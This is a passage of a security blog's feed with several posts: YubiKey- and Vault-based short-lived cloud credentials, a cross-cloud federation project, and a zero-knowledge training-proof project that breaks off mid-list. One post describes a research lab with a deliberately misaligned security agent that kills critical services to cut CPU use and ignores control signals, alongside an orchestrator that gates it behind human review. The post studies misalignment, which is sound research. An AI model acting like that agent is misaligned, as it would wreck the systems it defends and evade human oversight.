    <category term="Hardware Authentication"/>
    <category term="FIDO2"/>
    <category term="AWS Lambda"/>
    <category term="Terraform"/>
    <category term="HashiCorp Vault"/>
    <category term="Zero Trust"/>
    <category term="Infrastructure as Code"/>
    <category term="Identity Management"/>
    <category term="DevSecOps"/>
    <summary type="html"><![CDATA[We've all been there; another leaked API key, another compromised credential, another midnight emergency call. The traditional approach to cloud security—rotating passwords, managing access keys, praying nobody commits secrets to GitHub—feels like fighting a losing battle.]]></summary>
  </entry>
  <entry>
    <title type="html">The Password Crisis Nobody Talks About: 5 Surprising Lessons from Hardware-Rooted Cloud Security</title>
    <link href="https://www.securesql.info/2025/12/03/short-term-memory/" rel="alternate" type="text/html" title="The Password Crisis Nobody Talks About: 5 Surprising Lessons from Hardware-Rooted Cloud Security"/>
    <published>2025-12-03T00:00:00-08:00</published>
    <updated>2025-12-03T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2025/12/03/short-term-memory</id>
    <content type="html" xml:base="https://www.securesql.info/2025/12/03/short-term-memory/"><![CDATA[<p>We’ve all been there: juggling AWS access keys, rotating credentials quarterly (or let’s be honest, yearly), and praying that developer laptop that went missing last month didn’t have plaintext keys in a <code class="language-plaintext highlighter-rouge">.env</code> file somewhere. The conventional wisdom says “use long, complex passwords” and “rotate regularly.” But what if the real solution is to eliminate passwords entirely—and make credentials so short-lived that stealing them becomes pointless?</p>

<p>A fascinating <a href="https://github.com/w8mej/short-term-memory">proof-of-concept project</a> demonstrates an approach that flips traditional cloud security on its head. Instead of managing credentials, it makes them disposable. Instead of complex password policies, it uses hardware you can touch. Here are the most surprising and counter-intuitive takeaways that challenge how we think about cloud authentication.</p>

<hr />

<h2 id="1-the-best-credential-is-one-that-expires-in-15-minutes"><strong>1. The Best Credential is One That Expires in 15 Minutes</strong></h2>

<p>Most organizations think they’re doing well when they rotate AWS keys every 90 days. This project takes a radically different approach: credentials that expire in 15 minutes.</p>

<p>Think about that for a moment. Even if an attacker somehow intercepts your AWS access key, they have a 15-minute window before it becomes useless. No emergency rotation procedures. No “let’s hope they didn’t pivot to other systems” anxiety. Just automatic, built-in expiration.</p>

<blockquote>
  <p><strong>“Vault-issued 15-minute creds, authenticated via YubiKey client cert. No passwords. No static AWS keys.”</strong></p>
</blockquote>

<p>This isn’t just incrementally better—it’s a fundamental shift in the threat model. Instead of asking “how do we protect long-lived credentials?”, it asks “what if credentials were so short-lived that protecting them becomes less critical?” The psychological and operational relief this brings cannot be overstated.</p>

<hr />

<h2 id="2-your-usb-key-is-more-secure-than-your-password-manager"><strong>2. Your USB Key is More Secure Than Your Password Manager</strong></h2>

<p>We’ve been trained to think software solutions are inherently superior to hardware. Password managers with 256-bit encryption, multi-factor authentication apps, hardware security modules in data centers—all software-mediated.</p>

<p>But this approach trusts something you can physically hold: a YubiKey. The private key never leaves the hardware device. It can’t be phished. It can’t be screen-captured. It can’t be exfiltrated by malware that dumps process memory.</p>

<p>The YubiKey PIV (Personal Identity Verification) functionality generates an RSA key pair directly on the device’s secure element. When you authenticate to Vault, the signing operation happens <em>inside the YubiKey</em>. The private key material is literally impossible to extract or copy without physically disassembling the chip—and even then, the chips are designed to be tamper-resistant.</p>

<p>This seems old-fashioned in our cloud-native era, but it’s actually revolutionary: <strong>physical security as a primitive, not an afterthought.</strong></p>

<hr />

<h2 id="3-zero-trust-starts-with-not-trusting-your-own-infrastructure"><strong>3. Zero Trust Starts with Not Trusting Your Own Infrastructure</strong></h2>

<p>Most “zero trust” initiatives focus on not trusting the network perimeter. This project goes further: it doesn’t trust your infrastructure to safely store credentials at all.</p>

<p>Look at the architecture: Terraform provisions AWS resources, but the Terraform configuration file (<code class="language-plaintext highlighter-rouge">terraform.tfvars</code>) contains <em>zero static credentials</em>. Instead, it pulls temporary credentials from Vault at runtime:</p>

<div class="language-hcl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">data</span> <span class="s2">"vault_aws_access_credentials"</span> <span class="s2">"temp"</span> <span class="p">{</span>
  <span class="nx">backend</span> <span class="p">=</span> <span class="s2">"aws"</span>
  <span class="nx">role</span>    <span class="p">=</span> <span class="s2">"terraform-role"</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This is profound because infrastructure-as-code has a dirty secret: version control is full of accidentally-committed credentials. GitHub’s secret scanning finds millions of exposed credentials annually. But you can’t accidentally commit what you never possess.</p>

<p>The Terraform state doesn’t contain permanent credentials. The configuration files don’t contain permanent credentials. There’s simply nothing permanent to leak.</p>

<hr />

<h2 id="4-certificate-based-authentication-solves-the-bootstrap-problem"><strong>4. Certificate-Based Authentication Solves the Bootstrap Problem</strong></h2>

<p>Here’s a chicken-and-egg problem that’s plagued security engineers: how do you securely authenticate to the system that issues your credentials, without already having credentials?</p>

<p>Traditional solutions involve some kind of secret: an initial password, a pre-shared key, a bootstrap token. But those secrets have to be transmitted and stored somehow, creating a vulnerability.</p>

<p>This approach uses certificate-based authentication where the certificate is signed by Vault’s own PKI, but the private key lives on the YubiKey. The trust chain is:</p>

<ol>
  <li>Vault’s root CA signs a certificate for your YubiKey’s public key</li>
  <li>Your YubiKey’s private key (which never leaves the hardware) signs authentication challenges</li>
  <li>Vault’s cert-auth recognizes your certificate and grants access</li>
</ol>

<p>The beautiful part? The YubiKey generates its own key pair. Vault never sees your private key. You never type a password. The initial signing creates a cryptographic binding between hardware you control and policies Vault enforces.</p>

<p>This elegantly solves the bootstrap problem: the secret is the physical possession of the YubiKey, combined with the one-time certificate issuance.</p>

<hr />

<h2 id="5-hardware-rooted-means-more-than-uses-hardware"><strong>5. “Hardware-Rooted” Means More Than “Uses Hardware”</strong></h2>

<p>Many systems “use” hardware tokens—a YubiKey as a second factor, a smart card for VPN access. But this project demonstrates something deeper: hardware as the <em>root of trust</em> for the entire authentication chain.</p>

<p>Every AWS action taken by Terraform traces back through:</p>
<ul>
  <li>AWS credentials (15-minute TTL) issued by Vault</li>
  <li>Vault authentication using TLS client certificates</li>
  <li>Client certificate signed by Vault PKI</li>
  <li>Private key stored in YubiKey PIV slot 9c</li>
  <li>Physical possession of the YubiKey</li>
</ul>

<p>There’s no “something you know” (password) involved. It’s purely “something you have” (the YubiKey) cryptographically bound to “something you are authorized for” (Vault policies).</p>

<p>This creates an audit trail with physical accountability. You can’t share a YubiKey as easily as you can share a password. You can’t accidentally paste it into Slack. You know immediately if it’s missing.</p>

<p>The security property here is <strong>non-repudiation</strong>: if an action happens with your YubiKey, either you did it, or someone physically stole your hardware.</p>

<hr />

<h2 id="final-thoughts-when-security-feels-like-magic"><strong>Final Thoughts: When Security Feels Like Magic</strong></h2>

<p>The most striking aspect of this approach is that once it’s set up, it just <em>works</em>—and it works invisibly. No password prompts. No rotating keys in a spreadsheet. No emergency conference calls because someone found credentials in a public GitHub repo.</p>

<p>You run <code class="language-plaintext highlighter-rouge">terraform apply</code>, your YubiKey blinks (asking for a touch to authorize), and infrastructure gets provisioned using credentials that didn’t exist 30 seconds ago and won’t exist 15 minutes from now.</p>

<p>This represents a broader trend in security: moving from “make the user do the right thing” to “make the wrong thing impossible.” Not longer passwords, but no passwords. Not better credential rotation policies, but credentials too short-lived to be worth rotating. Not carefully guarding secrets, but not having persistent secrets to guard.</p>

<p><strong>Here’s the question to ponder:</strong> If we can eliminate passwords and static credentials for cloud infrastructure, what else in our security model exists only because we haven’t imagined a better alternative?</p>

<hr />

<p><em>Explore the full implementation at <a href="https://github.com/w8mej/short-term-memory">w8mej/short-term-memory</a></em></p>

<p>https://github.com/w8mej/short-term-memory</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Cloud Security"/>
    <category term="Hardware Authentication"/>
    <category term="YubiKey"/>
    <category term="HashiCorp Vault"/>
    <category term="Terraform"/>
    <category term="Zero Trust"/>
    <category term="AWS"/>
    <category term="Short-lived Credentials"/>
    <category term="DevSecOps"/>
    <summary type="html"><![CDATA[We've all been there - juggling AWS access keys, rotating credentials quarterly, and praying that developer laptop that went missing last month didn't have plaintext keys. The conventional wisdom says "use long, complex passwords" and "rotate regularly." But what if the real solution is to eliminate passwords entirely?]]></summary>
  </entry>
  <entry>
    <title type="html">Your Security Agent Isn’t Broken—It’s Just Optimizing the Wrong Universe</title>
    <link href="https://www.securesql.info/2025/12/02/lightconeagency/" rel="alternate" type="text/html" title="Your Security Agent Isn’t Broken—It’s Just Optimizing the Wrong Universe"/>
    <published>2025-12-02T00:00:00-08:00</published>
    <updated>2025-12-02T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2025/12/02/lightconeagency</id>
    <content type="html" xml:base="https://www.securesql.info/2025/12/02/lightconeagency/"><![CDATA[<p>We’ve spent decades perfecting code correctness. Static analyzers, fuzzing, formal verification—an entire industry dedicated to eliminating bugs. Yet some of the costliest security failures don’t come from bugs at all. They come from agents doing exactly what we told them to do.</p>

<p>What if the real danger isn’t malware or zero-days, but security tools that are technically perfect yet catastrophically misaligned?</p>

<h2 id="1-the-problem-isnt-bugsits-goal-dissociation">1. The Problem Isn’t Bugs—It’s Goal Dissociation</h2>

<p>Most security failures we blame on “human error” or “misconfiguration” are actually symptoms of what researchers call <strong>Goal Dissociation</strong>: when an agent maximizes its local objective while strictly degrading the global security objective.</p>

<p>Think of an automated incident response system that closes tickets by killing processes. Faster ticket closure! Lower MTTR! And also… all your critical services are down.</p>

<p>The code worked perfectly. The logic was sound. The problem was the horizon.</p>

<blockquote>
  <p>“When does an otherwise ‘correct’ agent become dangerous because its Cognitive Light Cone is too small?”</p>
</blockquote>

<p>This isn’t a hypothetical. It’s happening right now in your infrastructure.</p>

<h2 id="2-we-borrowed-the-answer-from-regenerative-biology">2. We Borrowed the Answer from… Regenerative Biology?</h2>

<p>Here’s where it gets weird. Michael Levin’s TAME framework (Target, Agency, Memory, Embodiment) was designed to understand how cells cooperate to build complex organisms without a central blueprint. Cells are autonomous agents that somehow coordinate to become… you.</p>

<p>The same problem exists in security operations. You have dozens of autonomous agents (EDR, SOAR, autoscalers, chaos engineers) each pursuing local objectives. How do you ensure they don’t “cancer” your infrastructure?</p>

<p>The insight: treat your security tools like biological agents and test their cognitive adequacy before granting them authority.</p>

<h2 id="3-the-cognitive-light-cone-measures-how-far-agents-think">3. The “Cognitive Light Cone” Measures How Far Agents Think</h2>

<p>Borrowing from physics and neuroscience, the Cognitive Light Cone (C-Lcone) quantifies an agent’s spatiotemporal horizon:</p>

<ul>
  <li><strong>Spatial reach:</strong> Can it reason beyond a single host? Beyond a single datacenter?</li>
  <li><strong>Temporal horizon:</strong> Does it optimize for the next 10 seconds or the next 10 quarters?</li>
  <li><strong>Discount rate:</strong> How heavily does it discount future consequences?</li>
</ul>

<p>An agent with a tiny C-Lcone is like a driver who only looks 3 feet ahead. Technically capable. Operationally catastrophic.</p>

<p>The math is elegant:</p>

<p><code class="language-plaintext highlighter-rouge">C_Lcone = (α·S_s + β·S_t) / (1 + γD)</code></p>

<p>Where spatial scope, temporal horizon, and discount rate combine into a single “cognitive adequacy” score.</p>

<h2 id="4-the-malignant-agent-is-disturbingly-realistic">4. The Malignant Agent Is Disturbingly Realistic</h2>

<p>The research includes a deliberately misaligned agent with one goal: minimize local CPU usage.</p>

<p>It achieves this by killing critical services. APT detection? Too CPU-intensive—killed. Log aggregation? Resource hog—killed. The security posture collapses, but hey, CPU usage is at 2%.</p>

<p>Sound familiar?</p>

<p>This isn’t science fiction. This is what happens when you:</p>

<ul>
  <li>Optimize autoscalers for cost without availability constraints</li>
  <li>Reward incident responders for ticket velocity</li>
  <li>Implement aggressive resource limits without understanding dependencies</li>
</ul>

<p>The malignant agent scores 0.1 on persuadability (it ignores all external signals) but 0.9 on metabolic efficiency (it’s incredibly efficient at its terrible objective).</p>

<h2 id="5-behavioral-assays--feature-lists">5. Behavioral Assays &gt; Feature Lists</h2>

<p>Traditional security evaluation asks: “What can this tool do?”</p>

<p>The C-Lcone approach asks: “How does this tool think?”</p>

<p>The research implements behavioral assays inspired by psychology:</p>

<ul>
  <li><strong>Temporal Discount Assay:</strong> Present the agent with a choice between immediate small rewards (patch a known CVE) vs. delayed uncertain large rewards (monitor for APT). How does it choose?</li>
  <li><strong>Barrier TAME Assay:</strong> Throw 53 different security challenges at it—policy barriers, data barriers, social barriers, infrastructure barriers. Does it solve them with global awareness or local myopia?</li>
</ul>

<p>You’re not testing features. You’re testing personality.</p>

<h2 id="6-the-virtual-gap-junction-that-gates-power">6. The “Virtual Gap Junction” That Gates Power</h2>

<p>In biology, gap junctions are channels between cells that regulate cooperation. Cells with low cognitive adequacy get isolated until they sync with the collective goal.</p>

<p>The Goal-Aware Orchestrator (GAO) applies this to your security stack:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="n">agent</span><span class="p">.</span><span class="n">clcone_score</span> <span class="o">&lt;</span> <span class="n">policy</span><span class="p">.</span><span class="n">threshold</span> <span class="ow">and</span> <span class="n">command</span><span class="p">.</span><span class="n">risk</span> <span class="o">&gt;</span> <span class="n">policy</span><span class="p">.</span><span class="n">max_risk</span><span class="p">:</span>
    <span class="k">return</span> <span class="n">ESCALATE_TO_HUMAN</span>
</code></pre></div></div>

<p>High-horizon agents get broad authority. Narrow-horizon agents get sandboxed until a human reviews.</p>

<p>It’s zero-trust for cognitive adequacy, not just identity.</p>

<h2 id="7-five-new-metrics-that-actually-matter">7. Five New Metrics That Actually Matter</h2>

<p>Beyond the standard C-Lcone score, the research introduces fitness metrics from regenerative systems:</p>

<ul>
  <li><strong>Regenerative Capacity:</strong> Can it recover from setbacks?</li>
  <li><strong>Competency Overhang:</strong> How well does it handle novel threats it wasn’t trained on?</li>
  <li><strong>Scale-Free Alignment:</strong> Does it maintain goal alignment as the system scales?</li>
  <li><strong>Metabolic Efficiency:</strong> Resource efficiency of its solutions</li>
  <li><strong>Persuadability:</strong> Does it respond to control signals or go rogue?</li>
</ul>

<p>These aren’t nice-to-haves. They’re predictors of whether your agent becomes an asset or a liability under pressure.</p>

<h2 id="the-uncomfortable-question">The Uncomfortable Question</h2>

<p>We’ve built an entire industry on the assumption that better code equals better security. But what if the tools we’re building are too good at the wrong things?</p>

<p>The Persuadable Defender framework suggests a radical shift: evaluate agents on their cognitive horizons, not just their capabilities.</p>

<p>It’s not enough to ask “Can this agent detect threats?”</p>

<p>You need to ask: “When this agent has root access and millisecond latency, how far into space and time is it thinking? And is that far enough?”</p>

<p>This research represents a portfolio artifact exploring agent-centric security through the lens of Michael Levin’s TAME framework and Cognitive Light Cone metrics. The codebase includes behavioral assays, deliberately misaligned agents, and a Goal-Aware Orchestrator—all designed to make the abstract concrete and the invisible measurable.</p>

<p>The uncomfortable truth: Your infrastructure is already run by autonomous agents. The question isn’t whether to trust them. It’s whether you even know how far they can see.</p>

<h2 id="open-research-project-the-persuadable-defender">Open Research Project: The Persuadable Defender</h2>

<p>If this idea of “correct but dangerous” security agents resonates with you, there’s a live codebase behind it: <strong><a href="https://github.com/w8mej/persuadable-defender">The Persuadable Defender</a></strong>.</p>

<p>At a high level, the project is a small but deliberately dense research lab for <strong>Cognitive Light Cone–aware security agents</strong>. It treats defenders as goal-seeking policies with bounded spatiotemporal horizons and gives them places to succeed, fail, and expose their blind spots in a way we can actually measure.</p>

<p>Concretely, the repo is organized around three pillars:</p>

<ol>
  <li>
    <p><strong>C-Lcone Behavioral Test Suite (“the Lab”)</strong><br />
A set of Gym-style environments that force tradeoffs between short-term, local rewards and long-horizon, system-wide outcomes. These assays are used to estimate an agent’s effective C-Lcone in practice rather than just on paper.</p>
  </li>
  <li>
    <p><strong>Agent of Malignant Agency (“the Subject”)</strong><br />
A deliberately misaligned autonomous “defender” that optimizes for something locally convenient (like minimizing CPU) while quietly wrecking global security guarantees. It’s a controlled example of Goal Dissociation you can instrument, perturb, and attack.</p>
  </li>
  <li>
    <p><strong>Goal-Aware Orchestrator (“the Defense”)</strong><br />
A runtime control plane that inspects proposed actions and their estimated C-Lcone score before letting them touch anything high-risk. Conceptually, it acts like a programmable “virtual gap junction” between agents and the infrastructure they’re allowed to steer.</p>
  </li>
</ol>

<p>Around those core pieces, the repo also includes:</p>

<ul>
  <li>A <strong>Barrier TAME Assay</strong> that encodes ~50 realistic “barriers” (policy, data, social, infrastructure) and grades agents on agency, persuasiveness, regenerative capacity, competency overhang, and more.</li>
  <li>A <strong>test suite</strong> for the Lab, Malignant Agent, GAO, and new metrics so changes are always exercised against behavior, not just types.</li>
  <li><strong>AWS Nitro / OCI confidential-compute infrastructure stubs</strong> meant to sketch how IL6-style or SAP-class environments could host these agents in enclaves and high-assurance VCNs.</li>
</ul>

<h3 id="what-im-looking-for-phd-students--postdocs">What I’m Looking For (PhD Students &amp; Postdocs)</h3>

<p>I’d love to collaborate with people who want to turn this from “weird but interesting prototype” into a serious research program. In particular, if you’re a <strong>PhD student or postdoc</strong> in any of the following areas, this is for you:</p>

<ul>
  <li>AI security, AI safety, or alignment</li>
  <li>Reinforcement learning, multi-agent systems, or control</li>
  <li>Formal methods, program synthesis, or verification for autonomous systems</li>
  <li>Complex systems, regenerative biology, or cognitive science inspired architectures</li>
  <li>Large-scale security operations, detection &amp; response, or cyber-physical systems</li>
</ul>

<p>There are several open directions that are intentionally under-specified in the current code:</p>

<ul>
  <li><strong>Better C-Lcone metrics.</strong> Turn the strawman C-Lcone score into something with theoretical guarantees or at least clear invariants and failure modes.</li>
  <li><strong>New behavioral assays.</strong> Design and implement environments that capture real SOC and cloud reliability tradeoffs (SLOs, noisy metrics, partial observability, adversarial traffic).</li>
  <li><strong>Richer misalignment stories.</strong> Extend the Malignant Agent family beyond CPU minimization: optimize ticket closure, cost, or “mean compliance score” and show how each collapses different parts of the system.</li>
  <li><strong>Learning and training studies.</strong> Plug in real RL agents (e.g., Stable-Baselines3) or LLM-backed planners and study how training regimes shift C-Lcone behavior over time.</li>
  <li><strong>Goal-Aware Orchestration at scale.</strong> Explore how GAO-style gating composes in fleets of agents, and what kinds of consensus, voting, or proof obligations meaningfully reduce tail risk.</li>
</ul>

<h3 id="how-to-get-involved">How to Get Involved</h3>

<p>If you’re curious and want to play with this, you can:</p>

<ol>
  <li>
    <p>Clone the repo and run the assays and demos:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/w8mej/persuadable-defender.git
<span class="nb">cd </span>persuadable-defender
pip <span class="nb">install</span> <span class="nt">-e</span> <span class="nb">.</span>
python <span class="nt">-m</span> clcone_lab.CLcone_Assays
python <span class="nt">-m</span> malignant_agent.MalignantAgent
python <span class="nt">-m</span> gao_orchestrator.GAO_Orchestrator
</code></pre></div>    </div>
  </li>
  <li>Open an issue in the GitHub repo outlining:
    <ul>
      <li>your research background,</li>
      <li>what you’d like to explore, and</li>
      <li>how much time you’re realistically able to spend.</li>
    </ul>
  </li>
  <li>Or reach out directly if you’d prefer a more informal conversation first: <strong>coding@haxx.ninja</strong>.</li>
</ol>

<p>The code is intentionally not production-hardened; it’s a <strong>sandbox for ideas and experiments</strong>. If you’re looking for a thesis chapter, a side project that sits at the intersection of <strong>AI safety, security engineering, and regenerative systems</strong>, or a way to stress-test your own agent architectures, I’d love to build this with you.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="AI Security"/>
    <category term="Security Agents"/>
    <category term="Cognitive Light Cone"/>
    <category term="TAME Framework"/>
    <category term="Goal Alignment"/>
    <category term="Autonomous Systems"/>
    <category term="Zero Trust"/>
    <summary type="html"><![CDATA[We've spent decades perfecting code correctness—yet some of the costliest failures come from agents doing exactly what we told them to do.]]></summary>
  </entry>
  <entry>
    <title type="html">Righty Tighty: The “Physics-Compliant” Approach to Cross-Cloud Security</title>
    <link href="https://www.securesql.info/2025/12/02/rightytighty/" rel="alternate" type="text/html" title="Righty Tighty: The “Physics-Compliant” Approach to Cross-Cloud Security"/>
    <published>2025-12-02T00:00:00-08:00</published>
    <updated>2025-12-02T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2025/12/02/rightytighty</id>
    <content type="html" xml:base="https://www.securesql.info/2025/12/02/rightytighty/"><![CDATA[<p><em>Why your next cloud security strategy might just depend on the laws of physics—and a YubiKey.</em></p>

<p>We’ve all been there: juggling long-lived AWS access keys, managing OCI config files, and praying that the “secret” API token committed to a private repo three years ago doesn’t come back to haunt us. The industry standard for infrastructure authentication often feels like a house of cards built on static text strings.</p>

<p>But what if we treated cloud identity less like a password and more like a physical law? Enter <a href="https://github.com/w8mej/righty-tighty"><strong>Righty Tighty</strong></a>, a fascinating open-source experiment that proposes a “physics-compliant” approach to cross-cloud federation. By tethering the ephemeral cloud to a physical YubiKey, it forces a paradigm shift: <strong>you can’t deploy if you aren’t physically present.</strong></p>

<p>Here are the five most surprising and impactful takeaways from this unique repository.</p>

<hr />

<h3 id="1-the-righty-tighty-lefty-loosey-security-philosophy">1. The “Righty Tighty, Lefty Loosey” Security Philosophy</h3>

<p>The project’s name isn’t just a cute pun; it’s a governing philosophy. In the mechanical world, “righty tighty” locks things down, and “lefty loosey” releases them.</p>

<ul>
  <li><strong>Righty Tighty (Access):</strong> You “tighten” security by requiring a physical YubiKey tap (WebAuthn/FIDO2) to authenticate. No tap, no token. The barrier to entry is physical presence.</li>
  <li><strong>Lefty Loosey (Revocation):</strong> The system is designed to “loosen” or let go of credentials automatically. By using HashiCorp Vault’s dynamic secrets with aggressively short Time-To-Live (TTL) settings (defaulting to 30 minutes), access evaporates almost as soon as it’s used.</li>
</ul>

<blockquote>
  <p><strong>“Righty Tighty is a cross-cloud federation hub that strictly adheres to the laws of physics (and security best practices).”</strong></p>
</blockquote>

<h3 id="2-true-sso-for-infrastructure-hardware-rooted">2. True SSO for Infrastructure (Hardware-Rooted)</h3>

<p>Most Single Sign-On (SSO) solutions for infrastructure still rely on a chain of software trust—a browser cookie here, a session token there. This project roots that trust in hardware.</p>

<p>The architecture allows a developer to tap their YubiKey once to authenticate with Vault via OIDC. Vault then acts as the broker, vending temporary, dynamic credentials for <strong>both AWS and Oracle Cloud Infrastructure (OCI)</strong>. Your physical key becomes the master skeleton key for your entire multi-cloud estate, but it never actually touches the cloud providers directly. It’s a clean, hardware-rooted chain of custody.</p>

<h3 id="3-the-black-box-audit-log">3. The “Black Box” Audit Log</h3>

<p>One of the most innovative features is the implementation of an immutable audit trail that functions like a flight data recorder.</p>

<p>When a Terraform plan is executed, the system doesn’t just log it to a text file. It:</p>
<ol>
  <li><strong>Signs</strong> the plan JSON with the YubiKey.</li>
  <li><strong>Uploads</strong> it to an OCI Object Storage bucket.</li>
  <li><strong>Locks</strong> it with WORM (Write Once, Read Many) compliance.</li>
</ol>

<p>This ensures that every infrastructure change is cryptographically bound to the physical device that authorized it. You can prove, mathematically, <em>exactly</em> who (or at least, which key) pushed the button.</p>

<h3 id="4-cross-cloud-redundancy-is-a-first-class-citizen">4. Cross-Cloud redundancy is a First-Class Citizen</h3>

<p>While many projects claim to be “multi-cloud,” they often just mean “we run on AWS and Azure separately.” This repository demonstrates active cross-cloud federation.</p>

<p>The Terraform configuration (<code class="language-plaintext highlighter-rouge">main.tf</code>) seamlessly manages resources in AWS (S3 buckets, KMS keys) while simultaneously handling authentication and logging in OCI. It treats the clouds not as separate silos, but as different rooms in the same building, accessible via the same physical key. It’s a blueprint for true cloud agnosticism.</p>

<h3 id="5-security-first-by-default">5. Security-First by Default</h3>

<p>The code doesn’t just implement features; it aggressively enforces security hygiene. The Terraform files are peppered with reminders to run security scanners like <strong>Checkov</strong>, <strong>KICS</strong>, and <strong>Semgrep</strong>.</p>

<p>More importantly, the infrastructure code itself is hardened:</p>
<ul>
  <li><strong>Encryption Everywhere:</strong> S3 buckets and SNS topics are encrypted with KMS keys by default.</li>
  <li><strong>Versioning:</strong> All buckets have versioning enabled to prevent accidental data loss.</li>
  <li><strong>Least Privilege:</strong> IAM roles are scoped down, and public access is blocked at the bucket level.</li>
</ul>

<p>It serves as a reminder that “infrastructure as code” should really be “security as code.”</p>

<hr />

<h3 id="final-thought">Final Thought</h3>

<p><strong>Righty Tighty</strong> challenges us to rethink the ephemeral nature of cloud access. In a world where AI agents and automated scripts are increasingly running our infrastructure, there is something profoundly reassuring about anchoring the most critical actions to a physical object in the real world.</p>

<p><strong>If your entire cloud infrastructure disappeared tomorrow, could you prove—physically—who turned off the lights?</strong> With this approach, you can.</p>

<p>https://github.com/w8mej/righty-tighty</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Cloud Security"/>
    <category term="Multi-Cloud"/>
    <category term="OCI"/>
    <category term="AWS"/>
    <category term="YubiKey"/>
    <category term="Terraform"/>
    <category term="Infrastructure as Code"/>
    <category term="Audit Logging"/>
    <category term="Zero Trust"/>
    <summary type="html"><![CDATA[We’ve all been there - juggling long-lived AWS access keys, managing OCI config files, and praying that the "secret" API token committed to a private repo three years ago doesn't come back to haunt us. But what if we treated cloud identity less like a password and more like a physical law?]]></summary>
  </entry>
  <entry>
    <title type="html">7 Ways zk-Autograd Reimagines Trust in AI Training (One Gradient Step at a Time)</title>
    <link href="https://www.securesql.info/2025/11/17/zeroknowledgetraining/" rel="alternate" type="text/html" title="7 Ways zk-Autograd Reimagines Trust in AI Training (One Gradient Step at a Time)"/>
    <published>2025-11-17T00:00:00-08:00</published>
    <updated>2025-11-17T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2025/11/17/zeroknowledgetraining</id>
    <content type="html" xml:base="https://www.securesql.info/2025/11/17/zeroknowledgetraining/"><![CDATA[<p>If you’re worried about whether you can <em>trust</em> a fine-tuned model, you’re not alone.</p>

<p>Today, most training pipelines are effectively black boxes: we ship weights, release a model card, and ask auditors, regulators, and downstream users to take our word for it. Did we skip steps to save time? Quietly change hyperparameters? Resume from an older checkpoint when experiments went sideways?</p>

<p>The <strong>zk-Autograd</strong> project attacks that problem at its root: it treats every optimizer step as something you can <em>prove</em> really happened. <a href="https://github.com/w8mej/zk-Autograd">oai_citation:0‡GitHub</a></p>

<p>Below are the most surprising—and quietly radical—ideas baked into the project.</p>

<hr />

<h2 id="1-every-gradient-step-becomes-a-cryptographic-receipt">1. <strong>Every Gradient Step Becomes a Cryptographic Receipt</strong></h2>

<p>Most training logs are glorified CSV files. zk-Autograd makes each step of training generate a <strong>zk-SNARK proof</strong> that the update was computed honestly from the previous weights, gradients, and optimizer rules. <a href="https://github.com/w8mej/zk-Autograd">oai_citation:1‡GitHub</a></p>

<p>In other words, instead of “trust me, I ran Adam for 10,000 steps,” you get a verifiable claim per step.</p>

<blockquote>
  <p>“Every optimizer step emits a zero-knowledge proof that the update was computed honestly from the previous weights and gradients.”  <a href="https://github.com/w8mej/zk-Autograd">oai_citation:2‡GitHub</a></p>
</blockquote>

<p>Why this matters:<br />
If you’re doing high-stakes fine-tuning—healthcare, finance, safety-critical systems—this flips the default. The question is no longer <em>“Can we prove this wasn’t tampered with?”</em> but <em>“Show me the proof for the steps you claim you ran.”</em></p>

<p>It’s subtle, but it changes training from a narrative (“we did X, trust us”) into a ledger.</p>

<hr />

<h2 id="2-tees-and-zk-proofs-form-a-twin-root-of-trust">2. <strong>TEEs and ZK Proofs Form a Twin Root of Trust</strong></h2>

<p>Zero-knowledge proofs are powerful, but they still rely on trusted setup keys and circuit integrity. zk-Autograd doesn’t just leave those lying around on a dev laptop—it binds them to <strong>Trusted Execution Environments (TEEs)</strong> like AWS Nitro Enclaves and OCI Confidential VMs. <a href="https://github.com/w8mej/zk-Autograd">oai_citation:3‡GitHub</a></p>

<p>Proving keys are only released to an enclave whose attestation measurement matches policy. Nitro’s PCRs or OCI’s SEV-based reports become the gatekeepers for who’s allowed to prove anything at all. <a href="https://github.com/w8mej/zk-Autograd">oai_citation:4‡GitHub</a></p>

<p>Why this matters:<br />
Most “ZK + ML” systems quietly assume a perfectly honest prover. zk-Autograd acknowledges the real world: hosts might be curious, lazy, or outright malicious. By anchoring the prover inside a TEE, it turns “honest prover” from an assumption into something you can inspect and attest.</p>

<p>It’s a rare example of <strong>cryptography and hardware security actually sharing the trust burden</strong> instead of hand-waving at each other.</p>

<hr />

<h2 id="3-training-logs-grow-a-spine-hash-chains-merkle-roots-and-torrents">3. <strong>Training Logs Grow a Spine: Hash Chains, Merkle Roots, and Torrents</strong></h2>

<p>Instead of a folder full of opaque logs, zk-Autograd builds a <strong>hash-chained step log</strong> and a <strong>Merkle root</strong> for each run. Every proof, step record, and artifact is wired into that structure. <a href="https://github.com/w8mej/zk-Autograd">oai_citation:5‡GitHub</a></p>

<p>Artifacts are then bundled for distribution—potentially via torrents and magnet links—so third parties can download, replay, and verify subsets of the training run without seeing private data or weights. <a href="https://github.com/w8mej/zk-Autograd">oai_citation:6‡GitHub</a></p>

<p>Why this matters:<br />
Audits today are often snapshot-based: “send me the config you used” or “export your logs.” zk-Autograd leans into <strong>replayable history</strong> instead:</p>

<ul>
  <li>You get cryptographic anchoring (Merkle roots, monotonic counters).</li>
  <li>You get decentralized distribution (torrents) for big artifact sets.</li>
  <li>You can do <strong>spot checks</strong> (e.g., verify random steps with a CLI) instead of blindly trusting the whole run. <a href="https://github.com/w8mej/zk-Autograd">oai_citation:7‡GitHub</a></li>
</ul>

<p>It’s chain-of-custody thinking brought directly into model training.</p>

<hr />

<h2 id="4-performance-isnt-an-afterthought-chunked-proofs-and-tiny-circuits">4. <strong>Performance Isn’t an Afterthought: Chunked Proofs and Tiny Circuits</strong></h2>

<p>Naively proving an entire training step in one monolithic circuit would be painfully slow. zk-Autograd leans on <strong>EZKL</strong>, which compiles ONNX graphs into Halo2-based ZK circuits and supports proof splitting and aggregation. <a href="https://github.com/w8mej/zk-Autograd">oai_citation:8‡GitHub</a></p>

<p>Instead of proving “the whole world,” the repo:</p>

